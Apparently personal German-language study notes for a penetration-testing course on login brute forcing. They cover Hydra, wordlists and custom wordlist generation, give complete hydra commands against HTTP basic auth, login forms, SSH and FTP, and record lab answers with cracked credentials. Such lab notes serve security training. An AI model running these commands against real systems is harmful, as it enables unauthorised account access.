@@ -1,0 +1,203 @@
+Login Brute Forcing
+Introduction
+1. Introduction to Brute Forcing:
+- Ein Brute Force Angriff ist eine Methode indem das Passwort durch automatisches Ausprobieren erraten wird
+- Passwoerter werden meistens nicht in Klartext sondern in Hashes gespeichert
+- In Windows werden Hashes/Passwoerter in unattend.xml, sysprep.inf, SAM usw gespeichert
+- In Linux werden Hashes/Passwoerter in shadow, shadow.bak, password usw gespeichert
+- Es gibt viele Tools fuer login-brute forcing:	
+	- Ncrack
+	- wfuzz
+	- medusa
+	- patator
+	- hydra
+
+###################################################################################################
+Basic HTTP Auth Brute Forcing
+1. Password Attacks:
+- Wir finden einen Web Server der auf einem nicht-standard Port laeuft
+- Die meisten Web Server verwenden Basic HTTP AUTH Schemas
+- Es gibt 2 verschiedene HTTP Authentifikation Mechanismen:
+	- 1. Basic HTTP Auth: User authenfizieren sich bei dem HTTP Server
+	- 2. Proxy Server Authentification: User identifiert sich durch einen Proxy Server bei dem Web-Server
+- Die Antwort des Servers beinhaltet ein Feld namens WWW-Authenticate Header Feld
+- Wenn wir keine Credentials oder offenen Ports haben koennen wir den Passwoerter Bruteforcen
+- Passwort Angriff Typen:
+	- Dictionary attack
+	- Brute force
+	- Traffic interception
+	- Man In the Middle
+	- Key Logging
+	- Social engineering
+- Wir werden uns auf Brute Force und Dictionary Attacks fokusieren
+
+- Brute Force Attack:
+	- Brute Forcing probiert alle moegliche Zeichen Kombinationen aus nur die Laenge muss spezifiziert werden eine Wortliste wird nicht gebraucht
+	- Brute force ist sehr ineffizient und ist sehr uverlaesslich grade ueber das Netzwerk
+
+- Dictionary Attack:
+	- Ein Dictionary Attack verwendet eine Wortliste um Passwoerter zu erraten
+	- Eine Liste hierfuer ist das Github Repo SecLists
+
+- Methods of Brute Force Attacks:
+	- Brute Force Attacks koennen Offline, Online durchgefuehrt werden
+	- Bei Revere Brute Force Attack wird der Username erraten mti einem haeufigen Passwort
+	- Hybrid Brute Force Attack verwendet eine individuelle Passwortliste, welche auf das Unternehmen angepeasst ist
+
+2. Default Password:
+- Standard Passwoerter werden meistens fuer Testzwecke verwendet
+- Die Passwoerter sind meistens sehr einfach gehalten und koennen im Internet nachgeschaut werden
+
+- Hydra:
+	- Hydra ist ein gutes Tool fuer Login Brute Forcing 
+	- Kann mit <apt install hydra -y> installiert werden
+
+- Default Passwords:
+	- Wir koennen nach Credentials Paar suchen wie test:test
+	- Es gibt eine standard Liste von Passwoertern Login Paaren in dem SecLists Repository
+	- Diese befinden sich unter /opt/useful/SecLists/Passwords/Default-Credentials
+	- hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt SEVER_IP -s PORT REQUEST_Method /
+	- -C ist die Woerterliste
+
+3. Username Brute Force:
+- In Hydra koennen wir ausserdem die Usernamen herausfinden
+- Wordlists:
+	- Einer diese Wortlisten ist rockyou.txt mit ueber 14 Millionen einzigartigen Passwoertern
+	- Fuer Usernamen Listen verwenden wir weiterhin SecLists
+
+- Username/Password Attack:
+	- Hydra benoetigt mindestens 3 Flags um einen brute force Attack durchzufuehren
+		- 1. Credentials
+		- 2. Target Host
+		- 3. Target Path
+
+	- Credentials koennen Usernamen und Passwoerter sein
+	- Mit -L wird Wortliste fuer Usernamen festgelegt
+	- Mit -P Wird die Wortliste fuer die Passwoerter festgelegt
+	- Mit -f stoppt Hydra nachdem es einen ersten Login gefunden hat
+	- Mit -u probiert erste alle User mit einem Passwort. Schleife dreht sich um die Benutzer
+	- hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
+
+
+- Username Brute Force:
+	- Wir koennen mit mit -l test das Passwort test kann der User statisch gesetzt werden
+	- Mit -p kann das Usernamen statisch gesetzt werden
+	- hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
+
+###################################################################################################
+Web Forms Brute Forcing
+1. Hydra Modules:
+- Brute Forcing Forms:
+	- Hydra hat viele verschiedene Anfragearten fuer verschiedene Services
+	- Alle unterstuetzen Services aufgelistet:
+		- hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
+	- Hier kann das Modul fuer hydra ausgewaehlt werden
+	- Mit hydra http-post-form -U konenn die Liste der Parameter ausgegeben werden die gebraucht werden
+	- In Zusammenfassung muessen wir 3 Parameter mitgeben die mit einem : getrennt sind:
+		- 1. URL Path for Login Form
+			- Beispiel: /login.php
+		- 2. POST Parameter fuer Username/Password
+			- Beispiel: [user parameter]=^USER^&[password parameter]=^PASS^
+		- 3. Der Failed/Success Login String sagt Hydra wann Hydra erfolgreich ist 
+			- Beispiel: :[FAIL/SUCCESS]=[success/failed string]
+
+- Fail/Success String:
+	- Damit Hydra entscheiden kann ob Credentials korrekt oder falsch sind benoetigen wir einen einzigartigen String fuer die Rueckmeldung
+
+2. Determine Login Parameters:
+- Wir koennen POST Parameter leicht finden indem wir die Anfrage in Burp Suite untersuchen
+- Sonst koennen wir uns auch den Source Code der Website ansehen
+- Using Browser:
+	- Mit [CTRL + SHIFT + E] koennen wir das Netzwerk Tool oeffnen
+	- Sonst koennen wir F12 druecken und dann auf Netzwerk Tools klicken
+	- Wir koennen dann die Anfrage rechtsklicken und dann auf Copy -> Copy POST Data klicken
+	- Wir koennen auch mit Copy-> Copy as cURL einen gesamten cURL Befehl kopieren
+
+- Using Burp Suite:
+	- Burp Suite ist fuer Websites gut die viele HTTP Anfragen senden
+	- Im Proxy Tab sollten wenn die Einstellugen in Firefox getroffen worden sind Anfragen eintreffen
+	- Darin sehen wir die Daten im Body
+
+3. Login Form Attacks:
+- Wenn wir keine Informationen ueber Ports oder Usernamen/Passwords haben koennen wir mit dem Hydra Modul http-post-form ausprobieren
+
+- Default Credentials:
+	- ftp-betterdefaultpasslist.txt ist eine Liste von Standardcredentials
+	- hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+- Password Wordlist:
+	- Meistens werden Usernamen wie admin, administrator, wpadmin, root, adm und andere fuer Adminstration Panels verwendet
+	- Hier koennen wir den Usernamen dann statisch festlegen
+	- hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+###################################################################################################
+Service Authentification Attacks:
+1. Personalized Wordlists:
+- Um eine Wordlist auf einen User anzupassen muessen Informationen ueber den User bekannt sein oder gesammelt werden
+
+- CUPP:
+	- Mit CUPP koennen individuelle Wordlists erstellt werden
+	- In ParrotOS kommt CUPP vorinstalliert sonst kann CUPP mit sudo apt install cupp installiert werden
+
+- Password Policy:
+	- Wenn wir 3 Regeln haben:
+		- 1. Laenger als 8 Zeichen
+		- 2. Enthaelt spezielle Zeichen
+		- 3. Enthaelt Nummern
+	- Also koennen wir alle anderen Passwoerter aus der Liste loeschen die den Regeln nicht entsprechen
+	- sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
+	- sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
+	- sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
+
+- Mangling:
+	- Es ist immer noch moeglich viele Permutationen der einzelnen Woerter dieser Liste zu erstellen
+	- Tools wie rsmangler oder The Mentalist ermoeglichen
+	- Permutationen sind Veraenderungen mit Gross-und Kleinschreibung usw
+	- Wenn das nicht passt kann die Liste nochmal angepasst werden
+
+- Custom Username Wordlist:
+	- Mit dem Programm <Username Anarchy> kann eine personalisierte Username Liste erstellt werden
+
+2. Service Authentication Brute Forcing:
+- SSH Attack:
+	- hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
+	- Attackiert den Login Service mit einer User- und eienr Passwortliste
+	- -t gibt die Anzahl parallele Versuche an
+
+- FTP Brute Forcing:
+	- Probiert verschiedene Passwoerter mit dem User m.gates aus
+	- hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
+
+
+[31735][SSH] host: 64.227.41.83 login: b.gates password: 4dn1l3M!$
+[21][ftp] host: 127.0.0.1   login: m.gates   password: computer
+
+###################################################################################################
+Skills Assessment
+1. Skills Assessment - Website:
+- 139.59.173.68:30668
+
+#####
+hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 139.59.173.68 -s 30668 http-get /
+[30668][http-get] host: 139.59.173.68   login: user   password: password
+
+
+#####
+http://139.59.173.68:30668/admin_login.php
+user=aa, pass=aa
+
+sudo hydra -l user -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt 139.59.173.68 -s 30668 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
+[30668][http-post-form] host: 139.59.173.68   login: user   password: harrypotter
+
+2. Skills Assessment - Service Login:
+- 161.35.168.118:31906
+#####
+./username-anarchy Harry Potter > HarryPotter.txt
+hydra -L HarryPotter.txt -P harry.txt -u -f ssh://161.35.168.118:31906 -t 4
+user: harry.potter pass: H4rry!!!
+
+
+#####
+hydra -l g.potter -P rockyou-30.txt ftp://127.0.0.1
+
+user: g.potter pass: harry
